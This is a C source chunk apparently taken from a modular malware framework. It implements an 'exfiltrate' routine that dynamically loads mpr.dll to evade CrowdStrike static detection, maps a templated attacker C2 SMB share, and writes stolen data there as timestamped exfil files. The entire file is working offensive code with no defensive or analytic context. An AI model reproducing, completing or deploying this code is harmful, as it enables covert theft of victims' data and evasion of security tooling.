// chunk: exfil/smb_dynamic
// depends: core/emit_buffer
// provides: exfiltrate
// note: Dynamic mpr.dll loading - SMB write exfil bypassing CrowdStrike static analysis

#ifndef CHUNK_SMB_DYNAMIC
#define CHUNK_SMB_DYNAMIC

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}
#define C2_SHARE "\\\\{{C2_IP}}\\share"

typedef DWORD (WINAPI *fn_WNetAddConnection2A)(LPVOID, LPCSTR, LPCSTR, DWORD);
typedef DWORD (WINAPI *fn_WNetCancelConnection2A)(LPCSTR, DWORD, BOOL);

static BOOL exfiltrate(const char *share, int unused, const char *data, DWORD len) {
    (void)unused;
    if (!data || len == 0 || !share) return FALSE;

    HMODULE mpr = LoadLibraryA("mpr.dll");
    if (!mpr) return FALSE;

    fn_WNetAddConnection2A pAddConn = (fn_WNetAddConnection2A)GetProcAddress(mpr, "WNetAddConnection2A");
    fn_WNetCancelConnection2A pCancel = (fn_WNetCancelConnection2A)GetProcAddress(mpr, "WNetCancelConnection2A");

    // Build filename with timestamp
    char filename[MAX_PATH];
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(filename, MAX_PATH, "%s\\exfil_%04d%02d%02d_%02d%02d%02d.bin",
             share, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    // Try to write directly first (might work if share is accessible)
    HANDLE hf = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);

    if (hf == INVALID_HANDLE_VALUE && pAddConn) {
        // Try connecting to share first
        struct {
            DWORD dwType;
            LPSTR lpLocalName;
            LPSTR lpRemoteName;
            LPSTR lpProvider;
        } nr = {0};
        nr.dwType = 1;  // RESOURCETYPE_DISK
        nr.lpRemoteName = (LPSTR)share;

        pAddConn(&nr, NULL, NULL, 0);
        hf = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    }

    if (hf == INVALID_HANDLE_VALUE) {
        FreeLibrary(mpr);
        return FALSE;
    }

    DWORD written;
    BOOL ok = WriteFile(hf, data, len, &written, NULL);
    CloseHandle(hf);

    FreeLibrary(mpr);
    return ok && written == len;
}

#endif
